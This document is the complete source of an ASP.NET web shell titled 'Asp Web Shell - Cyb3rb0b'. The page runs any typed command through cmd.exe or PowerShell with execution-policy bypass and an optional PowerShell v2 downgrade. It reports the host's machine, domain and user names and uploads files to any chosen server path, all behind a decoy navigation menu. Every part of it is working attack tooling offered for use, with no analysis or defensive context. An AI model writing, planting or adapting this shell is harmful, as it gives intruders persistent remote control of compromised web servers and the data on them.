<%@ Page Language="C#" Debug="true" Trace="false" %>

<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<html>

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="//netdna.bootstrapcdn.com/bootstrap/3.1.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//code.jquery.com/jquery-1.11.1.min.js"></script>

<script src="//netdna.bootstrapcdn.com/bootstrap/3.1.0/js/bootstrap.min.js"></script>

    <style>
        body {
            background-color: #fffff;
            color: #FFFFFF;
            overflow: hidden;
        }

        /*@media only screen and (max-width: 600px) {
            body {
                background-color: lightblue;
            }
        }

        @media only screen and (max-width: 768px) {
            body {
                background-color: red;
            }
        }
        @media only screen and (min-width: 1200px) {
            body {
                background-color: blue;
            }

        }*/
    </style>
    <title>Asp Web Shell - Cyb3rb0b</title>
    <%--<style>
        body {
            background-color: #012456;
            color: #FFFFFF;
            overflow: hidden;
        }
    </style>--%>
</head>
<script language="c#" runat="server">
    class ExecuteResult
    {
        public bool IsError { get; set; }
        public string Message { get; set; }
    }

    void Page_Load(object sender, EventArgs e)
    {
        this.SetFocus(this.txtArg);
        if (!IsPostBack)
        {
            this.setColor();

            StringBuilder sbl = new StringBuilder();
            sbl.Append("<table>");
            sbl.AppendFormat("<tr><td>Machine Name</td><td> {0}</td></tr>", Environment.MachineName);
            sbl.AppendLine();
            sbl.AppendFormat("<tr><td>Os Version</td><td> {0}</td></tr>", Environment.OSVersion);
            sbl.AppendLine();
            sbl.AppendFormat("<tr><td>User Domain Name</td><td> {0}</td></tr>", Environment.UserDomainName);
            sbl.AppendLine();
            sbl.AppendFormat("<tr><td>User Name</td><td> {0}</td></tr></table>", Environment.UserName);

            this.dvResult.InnerHtml += sbl.ToString() + "<hr/>";
        }
    }

    ExecuteResult ExcuteCmd(string arg)
    {
        ExecuteResult result = new ExecuteResult();
        ProcessStartInfo psi = new ProcessStartInfo();
        Process p = new Process();
        string error = string.Empty;
        StreamReader myStreamReader = null;
        if (this.shelloptions.SelectedValue.Equals("1"))
        {
            psi.FileName = "powershell.exe";
            psi.Arguments = "-nop -exec bypass " + arg;
        }
        else if (this.shelloptions.SelectedValue.Equals("0"))
        {
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c " + arg;


        }
        else if (this.shelloptions.SelectedValue.Equals("2"))
        {
            psi.FileName = "powershell.exe";
         psi.Arguments = "-nop -exec bypass -version 2" + arg;

        }


        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.UseShellExecute = false;


        p.StartInfo = psi;

        //p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
        p.Start();

        if (psi.FileName == "cmd.exe")
        {
            myStreamReader = p.StandardError;
            error = myStreamReader.ReadToEnd();

        }

        StreamReader stmrdr = p.StandardOutput;
        string s = stmrdr.ReadToEnd();
        stmrdr.Close();

        if (myStreamReader != null)
        {
            myStreamReader.Close();
        }
        
        if (string.IsNullOrEmpty(error))
        {
            result.IsError = false;
            result.Message = s;
        }
        else
        {
            result.IsError = true;
            result.Message = error;
        }

        return result;
    }


    void cmdExe_Click(object sender, System.EventArgs e)
    {
        if (this.txtArg.Text.ToLower().Equals("cls"))
        {
            this.dvResult.InnerHtml = string.Empty;
        }
        else
        {
            ExecuteResult result = ExcuteCmd(txtArg.Text);
            if (!result.IsError)
            {
                this.addResult(Server.HtmlEncode(result.Message));
            }
            else
            {
                this.addResult("<div style='color:red'>" + Server.HtmlEncode(result.Message) + "</div>");
            }


        }

        this.txtArg.Text = string.Empty;

    }

    protected void uploadfile_Click(object sender, EventArgs e)
    {
        this.upload.Visible = true;
        this.uploadcmd.Enabled = true;
    }

    protected void uploadcmd_Click(object sender, EventArgs e)
    {
        try
        {
            string path = Path.Combine(this.txtTo.Text, this.file.FileName);
            this.file.SaveAs(path);
            this.addResult("<div style='color:#f1bc31'>File Uploaded to: " + path + "</div>");

        }
        catch (Exception ex)
        {
            this.addResult("<div style='color:red'>" + ex.Message + "</div>");
        }
        finally
        {
            this.upload.Visible = false;
            this.uploadcmd.Enabled = false;
        }


    }

    private void addResult(string result)
    {
        this.dvResult.InnerHtml = "<hr/><div style='color:yellow'>" + DateTime.Now.ToString("HH:MM:ss") + "</div>" + result +
            this.dvResult.InnerHtml;
    }

    protected void shelloptions_SelectedIndexChanged(object sender, EventArgs e)
    {
        this.setColor();
    }

    private void setColor()
    {
        if (this.shelloptions.SelectedValue.Equals("0"))
        {
            this.directory.Text = Environment.CurrentDirectory + ">";
            this.body.Attributes.Add("style", "background-color:#000000");
            this.txtArg.Attributes.Add("style", "background-color:#000000;width: 50%;border: 0;color: #FFFF;font-weight: bold;");
        }
        else
        {
            this.directory.Text = "PS -nop -exec bypass >";
            this.body.Attributes.Add("style", "background-color:#012456");
            this.txtArg.Attributes.Add("style", "background-color:#012456;width: 50%;border: 0;color: #FFFF;font-weight: bold;");

        }
    }
</script>
<body id="body" runat="server">


   
    <form id="cmd" method="post" runat="server">
<a class="menu-bar" data-toggle="collapse" href="#menu">

    Options
            <span class="bars"></span>            
        </a>
        <div class="collapse menu" id="menu">
            <ul class="list-inline">
                <li><a href="#">Home</a></li>
                <li><a href="#">About</a></li>
                <li><a href="#">Services</a></li>
                <li><a href="#">Works</a></li>
                <li><a href="#">Contact</a></li>
            </ul>   
        </div>

        <div style="overflow: auto; height: 90%">
            <div id="upload" runat="server" visible="false">
                <asp:FileUpload ID="file" runat="server" />
                <asp:Label ID="lblTo" runat="server" Text="Destination Folder"></asp:Label>
                <asp:TextBox ID="txtTo" runat="server" style="color:black"></asp:TextBox>
                <asp:Button ID="uploadcmd" runat="server" Text="Upload" OnClick="uploadcmd_Click" Enabled="false" />

            </div>
            <pre id="dvResult" style="background-color:#000000;color:#FFF"  runat="server" class="">
           

        </pre>
        </div>

        <div style="position: absolute; bottom: 0; width: 100%; left: 0; border: none">
            <asp:Label ID="directory" runat="server"></asp:Label>
            <asp:TextBox ID="txtArg" runat="server" Style="width: 50%; border: 0; color: #FFFF; font-weight: bold;"></asp:TextBox>
            <asp:Button ID="testing" cssClass="btn btn-warning btn-sm" runat="server" Text="..." OnClick="cmdExe_Click"></asp:Button>
            <asp:Button cssClass="btn btn-success btn-sm" ID="uploadfile" runat="server" Text="Upload File" OnClick="uploadfile_Click" />
            <asp:DropDownList ID="shelloptions" runat="server" OnSelectedIndexChanged="shelloptions_SelectedIndexChanged" AutoPostBack="true">
                <asp:ListItem Text="Cmd" Value="0"></asp:ListItem>
                <asp:ListItem Text="PowerShell" Value="1"></asp:ListItem>
                <asp:ListItem Text="PowerShell V2" Value="2"></asp:ListItem>
            </asp:DropDownList>
        </div>



    </form>
</body>
</html>

